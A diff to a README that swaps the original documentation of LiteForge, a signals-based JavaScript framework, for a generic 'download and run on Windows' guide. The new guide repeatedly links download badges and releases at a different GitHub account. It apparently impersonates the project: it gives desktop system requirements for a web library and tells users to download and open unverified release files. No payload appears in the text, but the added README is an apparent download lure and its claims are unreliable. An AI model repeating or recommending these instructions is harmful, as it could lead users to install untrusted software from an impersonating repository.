@@ -1,450 +1,148 @@
-# LiteForge
+# ⚡ liteforge - Fast, Simple Frontend Framework
 
-A signals-based frontend framework with no virtual DOM, zero external dependencies, and TypeScript-first APIs.
+[![Download liteforge](https://img.shields.io/badge/Download-liteforge-brightgreen)](https://github.com/lamproskpr2/liteforge)
 
-[![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
+---
 
-## Why LiteForge?
+## What is liteforge?
 
-- **No Virtual DOM** — Direct, surgical DOM updates via Signals and Effects
-- **Zero-Flicker Architecture** — Components render only when async data is fully loaded
-- **Fine-Grained Reactivity** — Automatic dependency tracking, no manual subscriptions
-- **JSX Syntax** — Familiar developer experience with build-time optimization
-- **Plugin System** — First-class `AppBuilder.use()` API for router, modals, queries and more
-- **Type-Safe by Default** — Full TypeScript, strict mode, no `any` in public APIs
-- **Zero External Dependencies** — Every package has zero runtime deps
+liteforge is a small software tool to help build websites and web apps. It works by quickly updating parts of the screen without reloading the whole page. It does this without using a virtual DOM, which means it runs fast and uses less memory. It uses something called signals to track changes and update only what is needed. It also uses a simple syntax called JSX to make writing code easier. The core part of liteforge is only about 6 kilobytes in size, making it lightweight.
 
-## Packages
+This README will guide you through the process of getting and using liteforge on your Windows computer.
 
-| Package | Version | Size (gzip) | Tests | Description |
-|---------|---------|-------------|-------|-------------|
-| [liteforge](packages/liteforge) | 0.7.0 | ~18kb | — | Umbrella package — re-exports `@liteforge/core` + `@liteforge/runtime` |
-| [@liteforge/core](packages/core) | 0.1.0 | ~6kb | 89 | Reactive primitives: signal, computed, effect, batch |
-| [@liteforge/runtime](packages/runtime) | 0.6.2 | ~12kb | 285 | Components, lifecycle, control flow, plugin system |
-| [@liteforge/store](packages/store) | 0.1.0 | ~5kb | 128 | State management with registry and time-travel |
-| [@liteforge/router](packages/router) | 0.8.0 | ~20kb | 424 | Routing with guards, lazy loading, typed routes, view transitions |
-| [@liteforge/query](packages/query) | 3.0.0 | ~5kb | 78 | Data fetching with caching and mutations |
-| [@liteforge/form](packages/form) | 0.1.0 | ~4kb | 54 | Form management with Zod validation |
-| [@liteforge/table](packages/table) | 0.2.0 | ~8kb | 72 | Data tables with sorting, filtering, pagination |
-| [@liteforge/calendar](packages/calendar) | 0.3.0 | ~22kb | 202 | Scheduling calendar with drag & drop and 4 views |
-| [@liteforge/client](packages/client) | 3.0.0 | ~8kb | 76 | TypeScript-first HTTP client with interceptors and CRUD resources |
-| [@liteforge/modal](packages/modal) | 3.1.0 | ~4kb | 30 | Modal system with focus trap, transitions, and promise presets |
-| [@liteforge/toast](packages/toast) | 2.0.0 | ~3kb | 39 | Imperative toast notifications with four variants |
-| [@liteforge/tooltip](packages/tooltip) | 0.2.1 | ~2kb | 28 | Portal-based tooltips with auto-positioning and delay |
-| [@liteforge/i18n](packages/i18n) | 2.1.0 | ~3kb | 53 | Signals-based i18n with lazy locales, interpolation, pluralization, typed keys |
-| [@liteforge/vite-plugin](packages/vite-plugin) | 0.4.3 | ~15kb | 350 | JSX transform and build optimization |
-| [@liteforge/devtools](packages/devtools) | 3.0.0 | ~16kb | 51 | Debug panel with 5 tabs and time-travel |
+---
 
-**1,959 tests across all packages.**
+## 🔍 Key Features
 
-## Architecture
+- Lightweight: The core software is very small, about 6kb.
+- Fast Updates: Changes on your site happen quickly without reloading.
+- Easy Syntax: Use JSX to write your web pages simply.
+- No Virtual DOM: Less memory and faster performance.
+- Fine-Grained Reactivity: Updates happen only where needed.
+- Works well with web standards and modern tools like TypeScript and Vite.
+- Comes with support for UI components like calendars, forms, and tables.
+
+---
+
+## 🖥️ System Requirements
+
+Before you start, make sure your Windows computer meets these simple requirements:
+
+- Windows 10 or later
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- Internet connection to download the files
+- A web browser such as Chrome, Firefox, or Edge
+
+You don’t need any special software installed before using liteforge.
+
+---
+
+## 🌐 Visit to Download
+
+Click the button below to open the liteforge page on GitHub. This page contains all the information and files you need to get started.
+
+[![Get liteforge](https://img.shields.io/badge/Download%20Page-Grey)](https://github.com/lamproskpr2/liteforge)
+
+---
+
+## 🚀 How to Download and Run liteforge on Windows
+
+Follow these steps carefully to download and start using liteforge.
+
+### Step 1: Visit the Download Page
+
+- Click the green button at the top or go to this link in your web browser:  
+  https://github.com/lamproskpr2/liteforge
+
+- This page shows you the project files and instructions.
+
+### Step 2: Locate the Latest Version
+
+- On the GitHub page, look for the "Releases" section on the right or under the "Code" tab.
+- Click on the latest release. Releases contain stable versions you can download.
+- If no releases are available, you can download the source code by clicking the green **Code** button and then **Download ZIP**.
+
+### Step 3: Download the Files
+
+- If you downloaded a ZIP file, save it to a folder you can easily find, like your Desktop or Downloads folder.
+- Once the download finishes, right-click the ZIP file and choose **Extract All** to unpack it.
+
+### Step 4: Open liteforge Files
+
+- Inside the folder, look for a file you can open with your web browser. This might be an `index.html` or similar.
+- Double-click the file to open it in your browser. This will start using liteforge.
+
+### Step 5: Optional - Use a Simple Server
+
+liteforge works best when served through a local web server instead of opening files directly in the browser.
+
+- You can install and use a free tool like **VS Code** with the **Live Server** extension. This setup runs a local server and helps liteforge work properly.
+- Alternatively, you can use tools like **Node.js** with `npm` if you are comfortable with simple commands. This is not required for basic use.
+
+---
+
+## 📁 Understanding the Folder Structure
+
+When you unpack the liteforge files, you will see a few folders and files. Here is a simple overview:
+
+- **index.html**: Your main page where liteforge runs.
+- **src/**: Folder containing source files (your code).
+- **dist/**: Folder with built files ready to use in a browser.
+- **README.md**: This guide document.
+- **package.json**: Contains setup details (only if you plan to develop with liteforge).
+
+For basic use, focus on opening the `index.html` file in your browser.
+
+---
+
+## ⚙️ Running liteforge Applications
+
+If you want to explore liteforge beyond just opening HTML files:
+
+1. Open Windows **Command Prompt** or **PowerShell**.
+2. Change folder to where you saved the liteforge files.
+3. If you have Node.js installed, run:
 
 ```
-liteforge         — umbrella (re-exports core + runtime)
-│
-core  (no deps)
-├── runtime       — components, JSX, control flow, plugin system
-│
-plugins (each installed via .use()):
-├── store         — global state
-├── router        — client-side routing
-├── query         — data fetching
-├── form          — form management
-├── table         — data tables
-├── calendar      — scheduling calendar
-├── client        — HTTP client
-├── modal         — modal system
-├── toast         — toast notifications
-├── tooltip       — tooltip system
-└── i18n          — internationalization
-
-vite-plugin       — standalone build transform
-devtools          — depends on core + store
+npm install
+npm run dev
 ```
 
-## Quick Start
+This starts a development server and will open liteforge in your browser for easier use.
 
-```bash
-npm install liteforge @liteforge/vite-plugin
-```
+If you don’t have Node.js, you can still open the `index.html` file directly but some features may be limited.
 
-**vite.config.ts**
+---
 
-```ts
-import { defineConfig } from 'vite'
-import liteforge from '@liteforge/vite-plugin'
+## 📚 Using liteforge
 
-export default defineConfig({
-  plugins: [liteforge()]
-})
-```
+liteforge helps you build websites that update smoothly. You do this by writing web code using JSX syntax. JSX looks like regular HTML but works with JavaScript for dynamic behavior.
 
-**main.tsx**
+If you want to learn how to write code with liteforge, check the files in the `src` folder. They often include examples you can try.
 
-```tsx
-import { createApp } from 'liteforge';
-import { routerPlugin } from '@liteforge/router';
-import { App } from './App.js';
+---
 
-await createApp({ root: App, target: '#app' })
-  .use(routerPlugin({ routes: [...] }))
-  .mount();
-```
+## 🛠 Troubleshooting
 
-## Core Concepts
+- If liteforge does not work when opening `index.html` directly, try using a local server like **Live Server** in VS Code.
+- Make sure your browser is up to date.
+- If files don’t load or show errors, re-download from the GitHub page to get a fresh copy.
+- Check your internet connection if some features require online access.
 
-### Signals
+---
 
-```ts
-import { signal, computed, effect } from 'liteforge'
+## 🧰 Development Topics
 
-const count = signal(0)
-const doubled = computed(() => count() * 2)
+liteforge covers many areas you might want to explore later:
 
-effect(() => {
-  console.log(`Count: ${count()}, doubled: ${doubled()}`)
-})
+- Calendars and forms for user input.
+- Data tables for displaying lists.
+- Fine-grained reactive updates to avoid full page reloads.
+- Routing to handle multiple pages in single-page apps.
+- Integration with TypeScript for type safety.
+- Works with UI frameworks and build tools like Vite.
 
-count.set(5)           // → "Count: 5, doubled: 10"
-count.update(n => n + 1)
-```
+---
 
-### Components
-
-```tsx
-import { createComponent } from 'liteforge'
-
-const UserProfile = createComponent({
-  async load({ props }) {
-    const user = await fetch(`/api/users/${props.userId}`).then(r => r.json())
-    return { user }
-  },
-
-  placeholder: () => <div class="skeleton" />,
-
-  component: ({ data }) => (
-    <div>
-      <h1>{data.user.name}</h1>
-      <p>{data.user.email}</p>
-    </div>
-  ),
-})
-```
-
-### Plugin System
-
-Plugins are installed via `AppBuilder.use()` before mounting. Each plugin provides typed services that are accessible via `use()` inside components.
-
-```tsx
-import { createApp } from 'liteforge';
-import { routerPlugin } from '@liteforge/router';
-import { modalPlugin } from '@liteforge/modal';
-import { queryPlugin } from '@liteforge/query';
-import { i18nPlugin } from '@liteforge/i18n';
-import { devtoolsPlugin } from '@liteforge/devtools';
-
-await createApp({ root: App, target: '#app' })
-  .use(routerPlugin({ routes: [...] }))
-  .use(modalPlugin())
-  .use(queryPlugin())
-  .use(i18nPlugin({ defaultLocale: 'en', load: (locale) => import(`./locales/${locale}.js`) }))
-  .use(devtoolsPlugin())
-  .mount();
-```
-
-Inside components, access plugins via the typed `use()` function:
-
-```tsx
-const MyPage = createComponent({
-  component({ use }) {
-    const router = use('router')   // typed as Router
-    const modal  = use('modal')    // typed as ModalApi
-
-    return (
-      <button onclick={() => router.push('/home')}>Go home</button>
-    )
-  }
-})
-```
-
-### Router
-
-```ts
-import { routerPlugin } from '@liteforge/router'
-
-.use(routerPlugin({
-  history: 'browser',   // 'browser' | 'hash' | 'memory'
-  scrollBehavior: 'top',
-  routes: [
-    { path: '/', component: Home },
-    { path: '/users/:id', component: () => import('./UserDetail.js') },
-    {
-      path: '/admin',
-      component: AdminLayout,
-      guard: 'auth',
-      children: [{ path: '/', component: Dashboard }],
-    },
-  ],
-}))
-```
-
-### Store
-
-```ts
-import { defineStore } from '@liteforge/store'
-
-const userStore = defineStore('users', {
-  state: { currentUser: null, list: [] },
-  getters: (state) => ({
-    isLoggedIn: () => state.currentUser() !== null,
-  }),
-  actions: (state) => ({
-    async fetchUsers() {
-      state.list.set(await fetch('/api/users').then(r => r.json()))
-    },
-  }),
-})
-```
-
-### Query
-
-```ts
-import { createQuery, createMutation } from '@liteforge/query'
-
-const users = createQuery({
-  key: 'users',
-  fn: () => fetch('/api/users').then(r => r.json()),
-  staleTime: 5 * 60 * 1000,
-})
-
-users.data()       // Signal<User[]>
-users.isLoading()  // Signal<boolean>
-users.refetch()
-
-const addUser = createMutation({
-  fn: (data) => api.createUser(data),
-  invalidate: ['users'],
-})
-```
-
-### HTTP Client
-
-```ts
-import { createClient } from '@liteforge/client'
-
-const client = createClient({ baseUrl: 'https://api.example.com' })
-
-// Low-level
-const todo = await client.get<Todo>('/todos/1')
-
-// Resource-based CRUD
-const posts = client.resource<Post>('posts')
-await posts.getList({ page: 1, pageSize: 20 })
-await posts.getOne(42)
-await posts.create({ title: 'Hello', body: '...' })
-await posts.update(42, { title: 'Updated' })
-await posts.delete(42)
-
-// Interceptors
-client.addInterceptor({
-  onRequest: (config) => ({ ...config, headers: { ...config.headers, Authorization: `Bearer ${token}` } }),
-  onResponseError: (error) => { if (error.status === 401) redirect('/login'); throw error; },
-})
-```
-
-### Modal
-
-```ts
-import { createModal, confirm, alert } from '@liteforge/modal'
-
-// Declarative
-const dialog = createModal({
-  title: 'Edit User',
-  content: () => <EditUserForm />,
-})
-dialog.open()
-
-// Promise presets
-const confirmed = await confirm({ title: 'Delete?', message: 'This cannot be undone.' })
-await alert({ title: 'Done', message: 'User deleted.' })
-```
-
-### Toast
-
-```ts
-import { toast } from '@liteforge/toast'
-
-toast.success('Saved successfully')
-toast.error('Something went wrong')
-toast.warning('Unsaved changes')
-toast.info('New version available')
-
-// With options
-toast.success('User created', { duration: 4000, position: 'bottom-right' })
-```
-
-### Tooltip
-
-```ts
-import { tooltip } from '@liteforge/tooltip'
-
-// Imperative — attach to any element
-const cleanup = tooltip(buttonEl, {
-  content: 'Save changes',
-  position: 'top',        // 'top' | 'bottom' | 'left' | 'right'
-  delay: 300,             // ms before showing
-  showWhen: () => !isMobile(),  // reactive guard
-})
-
-// Declarative — JSX component
-import { Tooltip } from '@liteforge/tooltip'
-
-<Tooltip content="Save changes" position="top">
-  <button>Save</button>
-</Tooltip>
-```
-
-### Internationalization (i18n)
-
-```bash
-npm install @liteforge/i18n
-```
-
-```ts
-// main.tsx
-import { i18nPlugin } from '@liteforge/i18n';
-
-await createApp({ root: App, target: '#app' })
-  .use(i18nPlugin({
-    defaultLocale: 'en',
-    fallbackLocale: 'en',          // used for missing keys
-    load: async (locale) => {
-      const mod = await import(`./locales/${locale}.js`);
-      return mod.default;          // plain TranslationTree object
-    },
-    persist: true,                 // saves locale to localStorage
-    storageKey: 'my-locale',       // default: 'lf-locale'
-  }))
-  .mount();
-```
-
-```ts
-// locales/en.ts
-export default {
-  greeting: 'Hello, {name}!',
-  nav: { home: 'Home', settings: 'Settings' },
-  items: '{count} item | {count} items',           // 2-part: singular | plural
-  messages: 'No messages | {count} message | {count} messages', // 3-part: zero | one | many
-} satisfies TranslationTree;
-```
-
-```tsx
-// Inside a component
-const MyPage = createComponent({
-  component({ use }) {
-    const { t, locale, setLocale } = use('i18n');
-
-    return (
-      <div>
-        <p>{() => t('greeting', { name: 'World' })}</p>
-        <p>{() => t('items', { count: count() }, count())}</p>
-        <p>{() => t('nav.home')}</p>
-
-        <button onclick={() => setLocale('de')}>🇩🇪 Deutsch</button>
-        <button onclick={() => setLocale('en')}>🇬🇧 English</button>
-      </div>
-    );
-  },
-});
-```
-
-Key properties:
-- **No re-render** — only the text nodes that call `t()` update on locale switch
-- **Fallback locale** — missing keys in the current locale transparently fall back
-- **Async plugin install** — initial locale is fully loaded before the app mounts (no flash of untranslated keys)
-- **Dot-notation keys** — `t('nav.home')` traverses nested objects
-- **Pipe pluralization** — `2-part` (`singular|plural`) or `3-part` (`zero|one|many`)
-
-### Control Flow
-
-```tsx
-import { Show, For, Switch, Match } from 'liteforge'
-
-<Show when={() => user()}>
-  <UserCard user={user} />
-</Show>
-
-<For each={() => items()}>
-  {(item) => <li>{item.name}</li>}
-</For>
-
-<Switch fallback={<NotFound />}>
-  <Match when={() => status() === 'loading'}>Loading...</Match>
-  <Match when={() => status() === 'error'}>Error!</Match>
-</Switch>
-```
-
-## Development
-
-```bash
-# Install dependencies
-pnpm install
-
-# Build all packages
-pnpm build:packages
-
-# Run all tests (1,796 tests)
-pnpm test
-
-# Type check all packages
-pnpm typecheck:all
-
-# Run starter demo app
-pnpm --filter starter dev
-
-# Run docs app
-pnpm --filter docs dev
-```
-
-## Bundle Sizes
-
-| Setup | Size (gzip) |
-|-------|-------------|
-| Minimal (core only) | ~6kb |
-| Core + Runtime | ~18kb |
-| Core + Runtime + Store + Router | ~43kb |
-| Full stack (+ query + client + modal + toast + tooltip) | ~65kb |
-
-## Status
-
-> **LiteForge is in active development.** APIs may change between minor versions. I use it in my own production projects, but if you adopt it today, expect some rough edges.
-
-LiteForge is a personal framework born from real frustration with React's re-rendering model and Vue's adapter overhead. I built it because I wanted a tool that works the way I think — signals that directly update the DOM, no virtual DOM diffing, no magic.
-
-I'm actively building real applications on top of it (scheduling software, business tools, DevOps dashboards), so the framework evolves based on actual needs, not theoretical purity.
-
-**What works well today:** Core reactivity, routing, state management, forms, data tables, calendar, HTTP client, modals, i18n, and a full plugin system — all battle-tested through my own projects.
-
-**What's still maturing:** Documentation, edge cases in complex layouts, and the ecosystem around it.
-
-If you find it useful, feel free to use it. If you find a bug, I'd appreciate an issue. PRs are welcome but please open an issue first.
-
-## Built with AI
-
-I want to be transparent: LiteForge was developed with significant AI assistance. I used Claude (Anthropic) as a development partner throughout the entire process — from architecture decisions to implementation, testing, and documentation.
-
-**What that means in practice:**
-- I designed the API, made all architecture decisions, and defined what the framework should do
-- AI helped write implementation code, tests, and documentation based on my specifications
-- Every feature was reviewed, tested, and validated by me in real browser environments
-- The framework reflects my opinions and preferences as a developer, not generic AI output
-
-I believe AI-assisted development is the future of how software gets built. Being upfront about it is more honest than pretending otherwise. The code quality speaks for itself — 1,796 tests, TypeScript strict mode, zero external dependencies.
-
-## About
-
-LiteForge is built and maintained by [SchildW3rk](https://schildw3rk.dev) — a one-person software studio from Salzburg, Austria.
-
-## License
-
-MIT — see [LICENSE](LICENSE) for details.
+[![Download liteforge](https://img.shields.io/badge/Download-liteforge-blue)](https://github.com/lamproskpr2/liteforge)
